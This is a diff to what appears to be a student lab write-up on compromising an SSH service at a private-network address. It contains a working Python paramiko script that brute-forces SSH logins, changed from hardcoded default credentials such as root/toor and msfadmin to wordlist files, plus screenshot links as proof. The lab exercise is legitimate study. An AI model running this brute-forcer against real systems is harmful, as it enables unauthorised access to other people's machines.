@@ -12,28 +12,44 @@
 # Task1.1: 
 We choosed SSH service to compromise.
 
-![Screenshot 2025-04-27 204845](https://github.com/user-attachments/assets/bd3a3157-6bf5-471f-a9cc-2b5f0985d337)
+![Screenshot 2025-04-27 222648](https://github.com/user-attachments/assets/a77cc2c4-83fe-40f1-9f71-1d0a8cb5c31b)
+
 
 # Task1.2: Custom script for compromising the SSH service :
 import paramiko
 
-#Target Information  
+#Target Information
 
 target_ip = "192.168.8.36"
 
 target_port = 22
 
-#List of username/password combinations to try
 
-usernames = ["vagrant", "user", "root", "msfadmin"]
+#Files containing usernames and passwords
 
-passwords = ["vagrant", "user", "toor", "msfadmin", "1234", "password"]
+user_file_path = "user_file.txt"
+
+pass_file_path = "pass_file.txt"
+
 
 #Setup the SSH client
 
 ssh_client = paramiko.SSHClient()
 
 ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+
+#Read usernames and passwords from files
+
+with open(user_file_path, "r") as uf:
+
+    usernames = [line.strip() for line in uf if line.strip()]
+    
+
+with open(pass_file_path, "r") as pf:
+
+    passwords = [line.strip() for line in pf if line.strip()]
+    
 
 #Try all combinations
 
@@ -60,10 +76,17 @@ for username in usernames:
         except Exception as e:
         
             print(f"[!] Connection error: {e}")
+            
 
 print("[-] No valid credentials found.")
 
+
 Proof of Concept:
-![Screenshot 2025-04-27 211639](https://github.com/user-attachments/assets/beadd480-2105-4c11-838e-b32617b01b86)
+
+![Screenshot 2025-04-27 223238](https://github.com/user-attachments/assets/2fd540b2-2eab-46cc-819f-dd568370a04a)
+
+![Screenshot 2025-04-27 223258](https://github.com/user-attachments/assets/87715ffd-6527-40ba-8160-f0ba35fec694)
+
+it tried all possible combinations we took screenshots for the commands and when it found the correct credentials
 
 
